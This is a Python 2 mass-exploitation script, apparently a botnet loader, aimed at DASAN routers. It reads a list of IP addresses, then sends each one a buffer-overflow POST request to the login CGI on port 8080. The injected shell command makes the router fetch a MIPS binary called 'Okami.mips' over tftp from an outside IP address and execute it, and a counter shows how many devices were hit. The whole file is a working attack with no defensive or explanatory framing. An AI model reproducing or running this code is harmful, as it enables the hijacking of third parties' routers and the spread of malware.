#!/usr/bin/python

import sys, socket, json, time, ssl, struct, os
from threading import Thread
if len(sys.argv) < 2:
	print "Usage: python "+sys.argv[0]+" <list>"
	sys.exit()
port = 8080
buf = 4096
pre_pl0 = 0x2ad0c000
pre_pl2 = pre_pl0 + 0x00115d40
pl2 = struct.pack(">i",pre_pl2)
pre_pl3 = pre_pl0 + 0x0003CC9C
pl3 =  struct.pack(">i",pre_pl3)

payload = "/bin/sh tftp 178.156.202.115 -c get Okami.mips ; cat Okami.mips > aaa ; chmod 777 * ; ./aaa dasan.mips"
payload2 = "/bin/sh tftp -r Okami.mips -g 178.156.202.115 ; cat Okami.mips > bbb ; chmod 777 * ; ./bbb dasan.mips"

pre_data = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload
pre_data2 = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload2

post_data = "action="+pre_data+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
post_data2 = "action="+pre_data2+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"

headers = "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data))+"\r\n\r\n"+str(post_data)
headers2 = "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data2))+"\r\n\r\n"+str(post_data2)

i = 0
ips = open(sys.argv[1]).readlines()

def dasan(host):
    global i
    host = host.strip("\n")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = ssl.wrap_socket(sock)
        s.connect((host, port))
        s.send(headers)
        s.send(headers2)
        resp = s.recv(buf).strip()
        if "200 OK" in resp:
            i += 1
        s.close()
    except:
        pass
		
def worker():
    for ip in ips:
        try:
            ip = ip.strip("\r\n")
            t = Thread(target=dasan, args=(ip,))
            t.start()
        except:
            pass
    time.sleep(30)
    sys.exit("Finished Scanning")
workerthrd = Thread(target=worker)
workerthrd.start()
print headers
while True:
    try:
        sent = i
        sys.stdout.write("\r\033[36m[\033[37m!\033[36m] Payload Sent To \033[36m[\033[37m"+str(i)+"\033[36m] Devices.\033[0m")
        sys.stdout.flush()
        time.sleep(1)
    except KeyboardInterrupt:
        sys.exit("Exiting On User Input")
    except:
        pass
